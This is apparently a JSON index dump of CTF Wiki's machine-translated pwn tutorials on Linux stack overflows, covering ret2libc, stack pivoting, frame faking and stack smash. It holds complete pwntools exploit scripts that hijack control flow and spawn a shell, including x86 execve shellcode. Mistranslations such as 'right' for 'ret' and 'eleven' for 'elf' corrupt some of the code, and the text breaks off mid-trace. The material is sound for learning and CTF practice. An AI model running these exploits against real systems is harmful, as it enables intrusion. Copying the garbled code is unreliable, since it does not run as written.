1"},{"location":"pwn/linux/stackoverflow/basic-rop/#example-2","text":"Here is an example of ret2libc2 in bamboofox. \u70b9\u51fb\u4e0b\u8f7d: ret2libc2 This topic is basically the same as in Example 1, except that the /bin/sh string no longer appears, so we need to read the string ourselves, so we need two gadgets, the first control program reads the string, the first The two control programs execute system(\"/bin/sh\"). Since the vulnerability is consistent with the above, here is not to say more, the specific exp is as follows ##!/usr/bin/env python from pwn import * sh = process ( './ret2libc2' ) gets_plt = 0x08048460 system_plt = 0x08048490 pop_ebx = 0x0804843d buf2 = 0x804a080 payload = flat ( [ 'a' * 112 , gets_plt , pop_ebx , buf2 , system_plt , 0xdeadbeef , buf2 ]) sh . sendline ( payload ) sh . sendline ( '/bin/sh' ) sh . interactive () Note that I am writing the /bin/sh string to buf2 in the bss section of the program and passing its address as a parameter to system. This is so easy to get the shell.","title":"Example 2"},{"location":"pwn/linux/stackoverflow/basic-rop/#example-3","text":"Here is an example of ret2libc3 in bamboofox. \u70b9\u51fb\u4e0b\u8f7d: ret2libc3 On the basis of Example 2, the address of the system function is removed again. At this point, we need to find both the address of the system function and the address of the /bin/sh string. First, check the security \u279c ret2libc3 checksec ret2libc3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) As you can see, the source program still has stack unexecutable protection turned on. Looking at the source code, I found that the bug in the program is still a stack overflow. int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"No surprise anymore, system disappeard QQ.\" ); printf ( \"Can you find it !?\" ); gets (( char * ) & amp ; v4 ); return 0 ; } So how do we get the address of the system function? Here mainly use two knowledge points The system function belongs to libc, and the relative offset between functions in the libc.so dynamic link library is fixed. Even if the program has ASLR protection, it is only random for the middle bits of the address, and the lowest 12 bits will not change. And libc is collected on github, as follows https://github.com/niklasb/libc-database So if we know the address of a function in libc, then we can determine the libc that the program uses. Then we can know the address of the system function. So how do I get the address of a function in libc? The commonly used method is to use the got table leak, that is, output the contents of the got item corresponding to a function. Of course, due to the lazy binding mechanism of libc, we need to leak the address of the function that has been executed. We can naturally get libc according to the above steps, then query the offset in the program, and then get the system address again, but this manual operation is too many times, a little trouble, here is a libc utilization tool, please refer to the readme for details. https://github.com/lieanu/LibcSearcher In addition, after getting libc, there is actually a /bin/sh string in libc, so we can get the address of the /bin/sh string together. Here we leak the address of __libc_start_main because it is where the program was originally executed. Basic use ideas are as follows Leak __libc_start_main address Get the libc version Get the address of the system address and /bin/sh Execute the source program again Trigger stack overflow execution system('/bin/sh') Exp is as follows #!/usr/bin/env python from pwn import * from LibcSearcher import LibcSearcher sh = process ( './ret2libc3' ) ret2libc3 = ELF ( './ret2libc3' ) puts_plt = ret2libc3 . plt [ & #39;puts&#39;] libc_start_main_got = ret2libc3 . got [ '__libc_start_main' ] main = ret2libc3 . symbols [ 'main' ] print \"leak libc_start_main_got addr and return to main again\" payload = flat ([ 'A' * 112 , puts_plt , main , libc_start_main_got ]) sh . sendlineafter ( 'Can you find it !?' , payload ) print \"get the related addr\" libc_start_main_addr = u32 ( sh . recv ()[ 0 : 4 ]) libc = LibcSearcher ( '__libc_start_main' , libc_start_main_addr ) libcbase = libc_start_main_addr - libc . dump ( '__libc_start_main' ) system_addr = libcbase + libc . dump ( 'system' ) binsh_addr = libcbase + libc . dump ( 'str_bin_sh' ) print \"get shell\" payload = flat ([ 'A' * 104 , system_addr , 0xdeadbeef , binsh_addr ]) sh . sendline ( payload ) sh . interactive ()","title":"Example 3"},{"location":"pwn/linux/stackoverflow/basic-rop/#title_2","text":"train.cs.nctu.edu.tw: ret2libc","title":"Title"},{"location":"pwn/linux/stackoverflow/basic-rop/#topic","text":"train.cs.nctu.edu.tw: rop 2013-PlaidCTF-ropasaurusrex Defcon 2015 Qualifier: R0pbaby","title":"topic"},{"location":"pwn/linux/stackoverflow/basic-rop/#reference-reading","text":"[Black Cloud Step by Step ROP (Steamed Rice)] ( http://wooyun.jozxing.cc/static/drops/tips-6597.html ) [Hands to teach you stack overflow from entry to give up (on)] ( https://zhuanlan.zhihu.com/p/25816426 ) [Hands to teach you stack overflow from entry to give up (below)] ( https://zhuanlan.zhihu.com/p/25892385 ) [ [Technology Sharing] Modern Stack Overflow Utilization Technology Foundation: ROP] ( http://bobao.360.cn/learning/detail/3694.html )","title":"Reference reading"},{"location":"pwn/linux/stackoverflow/fancy-rop/","text":"\u82b1\u5f0f\u6ea2\u6ea2\u6280\u5de7 \u00b6 stack pivoting \u00b6 Principle \u00b6 Stack pivoting, as it describes, the trick is to hijack the stack pointer to the memory that the attacker can control, and then ROP at the appropriate location. In general, we may need to use stack pivoting in the following situations. The number of bytes that can be controlled by the stack overflow is small, making it difficult to construct a long ROP chain PIE protection is enabled, the stack address is unknown, we can hijack the stack to a known area. Other vulnerabilities are difficult to exploit, we need to convert, for example, hijacking the stack to the heap space, writing rop on the heap and making heap exploits In addition, there are several requirements for using socket pivoting. You can control the flow of program execution. You can control the sp pointer. In general, the control stack pointer will use ROP, and the common control stack pointers are usually gadgets. ` asm pop rsp/esp Of course, there will be some other postures. For example, gadgets in libc_csu_init, we can get the control rsp pointer by offset. The above is normal, the bottom is offset. `` `asm gef\u27a4 x/7i 0x000000000040061a 0x40061a <__libc_csu_init+90>: pop rbx 0x40061b <__libc_csu_init+91>: pop rbp 0x40061c <__libc_csu_init+92>: pop r12 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 &lt;__ libc_csu_init + 100&gt;: right gef\u27a4 x/7i 0x000000000040061d 0x40061d <__libc_csu_init+93>: pop rsp 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 &lt;__ libc_csu_init + 100&gt;: right In addition, there are more advanced fake frames. There is memory that can control the content, generally as follows bss segment. Since the process allocates memory by page, the memory allocated to the bss segment is at least one page (4k, 0x1000) in size. However, the contents of the general bss section do not use so much space, and the memory pages allocated by the bss section have read and write permissions. heap. But this requires us to be able to reveal the heap address. example \u00b6 Example 1 \u00b6 Here we take [X-CTF Quals 2016 - b0verfl0w] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20- % 20b0verfl0w) is introduced as an example. First, check the security of the program, as follows \u279c X-CTF Quals 2016 - b0verfl0w git: ( iromise ) \u2717 checksec b0verfl0w Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE ( 0x8048000 ) RWX: Has RWX segments It can be seen that the source program is 32-bit and NX protection is not enabled. Let's look for the vulnerability of the program. signed int vul () { char s ; // [sp+18h] [bp-20h]@1 puts ( \" \\n ======================\" ); puts ( \" \\n Welcome to X-CTF 2016!\" ); puts ( \" \\n ======================\" ); puts ( \"What's your name?\" ); fflush ( stdout ); fgets ( & s , 50 , stdin ); printf ( \"Hello %s.\" , & s ); fflush ( stdout ); return 1 ; } As you can see, there is a stack overflow vulnerability in the source program. But the only bytes that can overflow are only 50-0x20-4=14 bytes, so it is difficult to implement some better ROPs. Here we consider stack pivoting. Since the program itself does not have stack protection turned on, we can lay out shellcode on the stack and execute it. Basic use ideas are as follows Layout shellcode with stack overflow Control eip to point to shellcode The first step is still relatively easy to read directly, but since the program itself will open ASLR protection, it is difficult to directly know the address of the shellcode. But the relative offset on the stack is fixed, so we can use the stack overflow to operate on the esp to point to the shellcode and directly control the program to jump to the esp. The following is to find the control program to jump to the gadgets at the esp. \u279c X-CTF Quals 2016 - b0verfl0w git: ( iromise ) \u2717 ROPgadget --binary b0verfl0w --only 'jmp|ret' Gadgets information ============================================================ 0x08048504 : jmp esp 0x0804836a: right 0x0804847e: right 0xeac1 Unique gadgets found: 3 Here we find that there is a gadget that can jump directly to esp. Then we can lay out the payload as follows shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp Then the last part of our payload changes how to set esp, you can know size(shellcode+padding)=0x20 size(fake ebp)=0x4 size(0x08048504)=0x4 So the last step we need to execute is ` asm sub esp,0x28 jmp esp So the last exp is as follows ```python from pwn import * sh = process('./b0verfl0w') shellcode_x86 = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\" shellcode_x86 += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\" shellcode_x86 += \"\\x0b\\xcd\\x80\" sub_esp_jmp = asm('sub esp, 0x28;jmp esp') jmp_esp = 0x08048504 payload = shellcode_x86 + ( 0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp sh.sendline(payload) sh.interactive() Example 2 - Transfer heap \u00b6 Wait. Title \u00b6 EkoPartyCTF 2016 fuckzing-exploit-200 frame faking \u00b6 As the name suggests, this technique constructs a fake stack frame to control the execution flow of the program. Principle \u00b6 In a nutshell, the stack overflow we talked about before is nothing more than two ways. Control program EIP Control program EBP It ends up being the execution flow of the control program. In frame faking, the trick we use is to control both EBP and EIP, so that we control the execution flow of the program and also change the position of the stack frame. Generally its payload is as follows buffer padding|fake ebp|leave ret addr| That is, we use stack overflow to construct the stack as above. Here we mainly talk about the next two parts The return address of the function is overwritten by us to execute the address of the leave ret, which indicates that the function will perform a leave ret again after it has successfully executed its own leave ret. where fake ebp is the base address of the stack frame we constructed. Note that this is an address. In general, we construct a fake stack frame as follows fake ebp | v ebp2|target function addr|leave ret addr|arg1|arg2 Here our fake ebp points to ebp2, which is the address where ebp2 is located. Generally speaking, this is all readable content that we can control. The following assembly syntax is the intel syntax. Before we introduce the basic control process, we still need to talk about the basic operation of the entry and exit points of the function. Entry point Push ebp # push ebp Mov ebp, esp # assign the value of esp to ebp Exit point leave Ret #pop eip, pop the top element of the stack as the next execution address of the program Where the leave command is equivalent Mov esp, ebp # assign the value of ebp to esp Pop ebp # pop ebp Let's take a closer look at the basic control process. When a program with a stack overflow performs leave, it is divided into two steps. mov esp, ebp , which will also point esp to the ebp base address of the current stack overflow vulnerability. pop ebp, which assigns the value of fake ebp stored in the stack to ebp. That is, after executing the instruction, ebp points to ebp2, which is the address where ebp2 is stored. Execute the ret instruction and execute the leave ret instruction again. Execute the leave command, which is divided into two steps mov esp, ebp , which points esp to ebp2. pop ebp, in which case the content of ebp will be set to the value of ebp2, and esp will point to the target function. Execute the ret instruction, at which time the program will execute the target function and execute it when it is running the program. push ebp, which pushes the ebp2 value onto the stack. mov ebp, esp, points ebp to the current base address. The stack structure at this time is as follows ebp | v ebp2 | leave ret addr | arg1 | arg2 When the program is executed, it will apply for space normally. At the same time, we also arrange the parameters corresponding to the function on the stack, so the program will execute normally. After the program ends, it will execute leave ret addr twice, so if we have the corresponding content arranged at ebp2, then we can always control the execution flow of the program. It can be seen that in the fake frame, we have a requirement that we have to have a memory that can be written, and we also know the address of this memory, which is similar to stack pivoting. 2018 \u5b89\u6052\u676fover \u00b6 Take the over one of the An Heng Cup monthly competition in June 2018 as an example. The title can be found in [ctf-challenge] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow Found in /fake_frame/over) File Information \u00b6 over.over: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 99beb778a74c68e4ce1477b559391e860dd0e946, stripped [ * ] '/home/m4x/pwn_repo/others_over/over.over' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled FOOT: No FOOT 64-bit dynamically linked program, without PIE and canary protection, but opened NX protection \u5206\u6790\u7a0b\u5e8f \u00b6 Put it in IDA for analysis __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { setvbuf ( stdin , 0L L , 2 , 0L L ); setvbuf ( stdout , 0L L , 2 , 0L L ); while ( sub_400676 () ) ; return 0L L ; } int sub_400676 () { char buf [ 80 ]; // [rsp+0h] [rbp-50h] memset ( buf , 0 , sizeof ( buf )); putchar ( '>' ); read ( 0 , buf , 96uLL ); return puts ( buf ); } The vulnerability is obvious, read can read 96 bits, but the length of buf is only 80, so it can cover rbp and ret addr but can only cover rbp and ret addr, so it can only be controlled by controlling rbp and ret addr at the same time. Up leak stack \u00b6 In order to control rbp, we need to know some addresses. We can find that when the input length is 80, since read does not add '\\0' to the end of the input, the value of rbp will be printed by puts, so that we can Know the address of all locations on the stack by a fixed offset Breakpoint 1 , 0x00000000004006b9 in ?? () LEGEND : STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RBX 0x0 RCX 0x7ff756e9b690 ( __read_nocancel + 7 ) \u25c2\u2014 cmp rax , -0xfff RDX 0x60 RDI 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RSI 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) R8 0x7ff75715b760 ( _IO_stdfile_1_lock ) \u25c2\u2014 0x0 R9 0x7ff757354700 \u25c2 - 0x7ff757354700 R10 0x37b R11 0x246 R12 0x400580 \u25c2\u2014 xor ebp , ebp R13 0x7ffceaf112b0 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7ffceaf111b0 \u2014\u25b8 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 RSP 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RIP 0x4006b9 \u25c2\u2014 call 0x400530 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ DISASM ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x4006b9 call puts @ plt < 0x400530 > s : 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) 0x4006be leave 0x4006bf right 0x4006c0 push rbp 0x4006c1 mov rbp , rsp 0x4006c4 sub rsp , 0x10 0x4006c8 mov dword ptr [ rbp - 4 ], edi 0x4006cb mov qword for [ rbp - 0x10 ], rsi 0x4006cf mov rax , qword ptr [ rip + 0x20098a ] < 0x601060 > 0x4006d6 mov ecx , 0 0x4006db mov edx , 2 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ STACK ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00 : 0000 \u2502 rax rdi rsi rsp 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) ... \u2193 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ BACKTRACE ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba f 0 4006 b9 f 1 400715 f 2 7f f756de02b1 __libc_start_main + 241 Breakpoint * 0x4006B9 pwndbg > stack 15 00 : 0000 \u2502 rax rdi rsi rsp 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) ... \u2193 0 a : 0050 \u2502 rbp 0x7ffceaf111b0 \u2014\u25b8 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 0 b : 005 8 \u2502 0x7ffceaf111b8 \u2014\u25b8 0x400715 \u25c2\u2014 test eax , eax 0 c : 0060 \u2502 0x7ffceaf111c0 \u2014\u25b8 0x7ffceaf112b8 \u2014\u25b8 0x7ffceaf133db \u25c2\u2014 ' . / over . over ' 0 d : 006 8 \u2502 0x7ffceaf111c8 \u25c2\u2014 0x100000000 0 e : 0070 \u2502 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 pwndbg > distance 0x7ffceaf111d0 0x7ffceaf11160 0x7ffceaf111d0 -> 0x7ffceaf11160 is -0x70 bytes ( -0xe words ) After leaking the stack address, we can control the program flow by controlling rbp as the address on the stack (such as 0x7ffceaf11160) and ret addr as the address of leave ret. For example, we can fill in the rop chain of the leak libc at 0x7ffceaf11160 + 0x8 and control it back to the sub_400676 function to leak libc. \u200b Then on the next use, you can use the rop to execute system(&quot;/bin/sh&quot;) or execve(&quot;/bin/sh&quot;, 0, 0) to get the shell. This question is because the input is long enough. , we can arrange the use chain of execve(&quot;/bin/sh&quot;, 0, 0) , this method is more secure ( system(&quot;/bin/sh&quot;) may be invalidated due to env destruction) , but because the structure of the stack changes during the process, some key offsets need to be determined by debugging. exp \u00b6 from pwn import * context . binary = \"./over.over\" def DEBUG ( cmd ): raw_input ( \"DEBUG: \" ) gdb . attach ( io , cmd ) io = process ( \"./over.over\" ) eleven = ELF ( & quot ; ./ over . over & quot ;) libc = elf . libc io . sendafter ( \">\" , 'a' * 80 ) stack = u64 ( io . recvuntil ( & quot ; x7f & quot ;) [ - 6 :] . light ( 8 , & #39;0&#39;)) - 0x70 success ( \"stack -> {:#x} \" . format ( stack )) # DEBUG(\"b *0x4006B9\\nc\") io . sendafter ( \">\" , flat ([ '11111111' , 0x400793 , elf . got [ 'puts' ], elf . plt [ 'puts' ], 0x400676 , ( 80 - 40 ) * '1' , stack , 0x4006be ])) libc . address = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - libc . sym [ 'puts' ] success ( \"libc.address -> {:#x} \" . format ( libc . address )) pop_rdi_ret = 0x400793 ''' $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop | ret&quot; 0x00000000000f5279 : pop rdx ; pop rsi ; ret ''' pop_rdx_pop_rsi_ret = libc . address + 0xf5279 payload = flat ([ '22222222' , pop_rdi_ret , next ( libc . search ( \"/bin/sh\" )), pop_rdx_pop_rsi_ret , p64 ( 0 ), p64 ( 0 ), libc . sym [ 'execve' ], ( 80 - 7 * 8 ) * '2' , stack - 0x30 , 0x4006be ]) io . sendafter ( \">\" , payload ) io . interactive () In general, this method is not very different from the stack pivot. Reference reading \u00b6 http://www.xfocus.net/articles/200602/851.html http://phrack.org/issues/58/4.html Stack smash \u00b6 Principle \u00b6 After the program is added with canary protection, if the buffer we read overwrites the corresponding value, the program will report an error, and generally we will not care about the error message. The stack smash trick is to use the program that prints this information to get what we want. This is because after the program starts canary protection, if the canary is found to be modified, the program will execute the __stack_chk_fail function to print the string pointed to by the argv[0] pointer. Normally, this pointer points to the program name. Its code is as follows void __attribute__ (( noreturn )) __stack_chk_fail ( void ) { __fortify_fail ( \"stack smashing detected\" ); } void __attribute__ (( noreturn )) internal_function __fortify_fail ( const char * msg ) { /* The loop is added only to keep gcc happy. */ while ( 1 ) __libc_message ( 2 , \"*** %s ***: %s terminated \\n \" , msg , __libc_argv [ 0 ] ?: \"<unknown>\" ); } So if we use stack overflow to override argv[0] for the address of the string we want to output, then we will output the information we want in the __fortify_fail function. 32C3 CTF readme \u00b6 Here, we introduce the 2015 32C3 CTF readme as an example, which is reproduced on jarvisoj. Determining protection \u00b6 It can be seen that the program is 64-bit, mainly enabling Canary protection and NX protection, as well as FORTIFY protection. \u279c stacksmashes git: ( master ) \u2717 checksec smashes Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) FORTIFY: Enabled \u5206\u6790\u7a0b\u5e8f \u00b6 Ida look __int64 sub_4007E0 () { __int64 v0 ; // rax @ 1 __int64 v1 ; // rbx@2 int v2 ; // eax@3 __int64 v4 ; // [sp + 0h] [bp-128h] @ 1 __int64 v5 ; // [sp+108h] [bp-20h]@1 v5 = * MK_FP ( __FS__ , 40L L ); __printf_chk ( 1L L , ( __int64 ) \"Hello! \\n What's your name? \" ); LODWORD ( v0 ) = _IO_gets (( __ int64 ) & amp ; v4 ); if ( ! v0 ) LABEL_9 : _exit ( 1 ); v1 = 0L L ; __printf_chk ( 1L L , ( __int64 ) \"Nice to meet you, %s. \\n Please overwrite the flag: \" ); while ( 1 ) { v2 = _IO_getc ( stdin ); if ( v2 == -1 ) goto LABEL_9 ; if ( v2 == '\\n' ) break ; byte_600D20 [ v1 ++ ] = v2 ; if ( v1 == ' ' ) goto LABEL_8 ; } memset (( void * )(( signed int ) v1 + 0x600D20LL ), 0 , ( unsigned int )( 32 - v1 )); LABEL_8 : puts ( \"Thank you, bye!\" ); return * MK_FP ( __FS__ , 40L L ) ^ v5 ; } Obviously, the program has a stack overflow in _IO_gets((__int64)&amp;v4) ; In addition, the program also prompts to overwrite the flag. And found that the program is very interesting to execute this statement after the while loop memset (( void * )(( signed int ) v1 + 0x600D20LL ), 0 , ( unsigned int )( 32 - v1 )); Looking at the contents of the corresponding address, you can find the following content, indicating that the flag of the program is here. .data:0000000000600D20 ; char aPctfHereSTheFl[] .data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0 But if we directly use the stack overflow to output the contents of the address is not feasible, this is because the content we read byte_600D20[v1++] = v2; is exactly the block memory, which will directly overwrite it, this We need to use a skill. When ELF memory maps, the bss section is mapped twice, so we can use another address for output, which can be found using gdb's find. Determine the flag address \u00b6 We download the breakpoint from the memset function and read the corresponding content as follows ` asm gef\u27a4 c Continuing. Hello! What's your name? qqqqqqq Nice to meet you, qqqqqqq. Please overwrite the flag: 222222222 Breakpoint 1, __memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:38 38 ../sysdeps/x86_64/multiarch/memset-avx2.S: There is no such file or directory. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x7ffff7b7f920 <__memset_chk_avx2+0> cmp rcx, rdx 0x7ffff7b7f923 <__memset_chk_avx2+3> jb 0x7ffff7b24110 <__GI___chk_fail> 0x7ffff7b7f929 nop DWORD PTR [rax+0x0] \u2192 0x7ffff7b7f930 <__memset_avx2+0> vpxor xmm0, xmm0, xmm0 0x7ffff7b7f934 <__memset_avx2+4> vmovd xmm1, esi 0x7ffff7b7f938 <__memset_avx2+8> lea rsi, [rdi+rdx*1] 0x7ffff7b7f93c <__memset_avx2+12> mov rax, rdi \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0x7fffffffda38', 'l8'] 8 0x00007fffffffda38\u2502+0x00: 0x0000000000400878 \u2192 mov edi, 0x40094e \u2190 $rsp 0x00007fffffffda40\u2502+0x08: 0x0071717171717171 (\"qqqqqqq\"?) 0x00007fffffffda48\u2502+0x10: 0x0000000000000000 0x00007fffffffda50\u2502+0x18: 0x0000000000000000 0x00007fffffffda58\u2502+0x20: 0x0000000000000000 0x00007fffffffda60\u2502+0x28: 0x0000000000000000 0x00007fffffffda68\u2502+0x30: 0x0000000000000000 0x00007fffffffda70\u2502+0x38: 0x0000000000000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0x7ffff7b7f930 \u2192 Name: __memset_avx2() [# 1] 0x400878 \u2192 mov edi, 0x40094e \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 find 22222 Argument required (expression to compute). gef\u27a4 find '22222' No symbol \"22222\" in current context. given grip '22222' [+] Searching '22222' in memory [+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x600000-0x601000), permission=rw- 0x600d20 - 0x600d3f \u2192 \"222222222's the flag on server}\" [+] In '[heap]'(0x601000-0x622000), permission=rw- 0x601010 - 0x601019 \u2192 \"222222222\" donated PCTF [+] Searching 'PCTF' in memory [+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x400000-0x401000), permission=r-x 0x400d20 - 0x400d3f \u2192 \"PCTF{Here's the flag on server}\" It can be seen that the 2222 we read has covered the flag at 0x600d20, but we still find the backup of this flag at 0x400d20 in memory, so we can still output it. Here we have determined the address of the flag. #### Determining the offset Next, we determine the offset of the string read by argv[0]. First break the breakpoint at the main function entry, as follows `` `asm gef\u27a4 b *0x00000000004006D0 Breakpoint 1 at 0x4006d0 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes Breakpoint 1, 0x00000000004006d0 in ?? () code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x4006c0 <_IO_gets@plt+0> jmp QWORD PTR [rip+0x20062a] # 0x600cf0 <_IO_gets@got.plt> 0x4006c6 <_IO_gets@plt+6> push 0x9 0x4006cb <_IO_gets@plt+11> jmp 0x400620 \u2192 0x4006d0 sub rsp, 0x8 0x4006d4 mov rdi, QWORD PTR [rip + 